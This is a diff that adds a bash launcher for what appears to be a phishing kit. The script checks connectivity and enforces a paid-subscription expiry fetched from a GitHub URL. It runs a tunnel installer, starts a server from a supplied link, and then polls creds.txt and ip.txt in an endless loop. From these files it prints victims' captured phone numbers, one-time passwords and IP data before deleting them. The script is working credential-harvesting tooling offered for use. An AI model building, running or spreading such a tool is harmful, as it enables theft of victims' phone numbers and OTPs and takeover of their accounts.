@@ -1,0 +1,147 @@
+#!/usr/bin/bash
+
+current_date=$(date +%d:%m:%y)
+conf_file=$2
+
+source animation.psf
+source colors.psf
+
+color_mode 1
+
+connection()
+{
+curl -sI 1.1.1.1 &> /dev/null
+}
+
+
+if (! connection == 0)
+then
+NET=off
+else
+NET=on
+fi
+
+if [[ $NET == "off" ]]
+then
+printf  "\a\e[90m
+█▀▀▀▀▀█▀▅
+█     █  ▅
+█  █  █   ▅
+█     ▀▀▀▀█
+█         █
+█  ▅▀▀▀▀▅ █
+█         █
+▀▀▀▀▀▀▀▀▀▀▀
+"
+
+printf "\e[0;1m
+This connection can’t be reached The connection was reset.
+Try:
+
+Checking the connection
+ERR_CONNECTION_RESET
+\e[0m"
+exit 0
+fi
+
+
+declare -i -a CRC32_LOOKUP_TABLE
+
+__generate_crc_lookup_table() {
+  local -i -r LSB_CRC32_POLY=0xEDB88320 # The CRC32 polynomal LSB order
+  local -i index byte lsb
+  for index in {0..255}; do
+    ((byte = 255 - index))
+    for _ in {0..7}; do # 8-bit lsb shift
+      ((lsb = byte & 0x01, byte = ((byte >> 1) & 0x7FFFFFFF) ^ (lsb == 0 ? LSB_CRC32_POLY : 0)))
+    done
+    ((CRC32_LOOKUP_TABLE[index] = byte))
+  done
+}
+__generate_crc_lookup_table
+typeset -r CRC32_LOOKUP_TABLE
+
+crc32_string() {
+  [[ ${#} -eq 1 ]] || return
+  local -i i byte crc=0xFFFFFFFF index
+  for ((i = 0; i < ${#1}; i++)); do
+    byte=$(printf '%d' "'${1:i:1}") # Get byte value of character at i
+    ((index = (crc ^ byte) & 0xFF, crc = (CRC32_LOOKUP_TABLE[index] ^ (crc >> 8)) & 0xFFFFFFFF))
+  done
+  echo $((crc ^ 0xFFFFFFFF))
+}
+
+#userid=$(cat ${conf_file} | jq .credential.userid -M -r)
+
+str1=$(curl -sL https://raw.githubusercontent.com/BMX5FRyAcQANmC703/SUBSCRIPTION/main/bb92817c/expiry)
+
+date_of_start=$(printf '%08x\n' "$(crc32_string "${current_date}")")
+date_of_end=$(printf '%08x\n' "$(crc32_string "${str1}")")
+
+if [[ ${date_of_end} == "0" ]]
+then
+      :
+else
+if [[ ${date_of_start} == ${date_of_end} ]]
+then
+echo -e "\e[91mSorry, your subscription is ended.\e[0m
+Renew your subscription to continue.
+Contact owner of this tool get back your subscription.
+\e[92m${1}\e[0m"
+exit 1
+fi
+fi
+
+# crc32_string "The quick brown fox jumps over the lazy dog"
+# yields 414fa339
+
+bash tunnel.installer
+source tunnel.configure
+
+function startServer () {
+get_input
+
+if [ ${#link} == 0 ]
+then
+exit 1
+fi
+sleep 0.5
+
+echo -e "\n${b0SIGN} Credentials details visible here !\n"
+}
+
+credentials() {
+num=$(cat creds.txt | grep "number=" | cut -c 8-)
+otp=$(cat creds.txt | grep "otp=" | cut -c 5-)
+
+if [[ ! ${#num} == 0 ]]
+then
+echo -e "${g0SIGN} Number : ${num}"
+fi
+
+if [[ ! ${#otp} == 0 ]]
+then
+#if [[ ! ${otp} == " " ]]
+#then
+echo -e "${g0SIGN} Otp : ${otp}\n"
+fi
+#fi
+rm creds.txt &> /dev/null
+}
+
+function credentialLoop () {
+while true
+do
+if [ -f "ip.txt" ]
+then
+user_data
+fi
+if [ -f "creds.txt" ]
+then
+credentials
+fi
+done
+}
+
+       startServer
+       credentialLoop
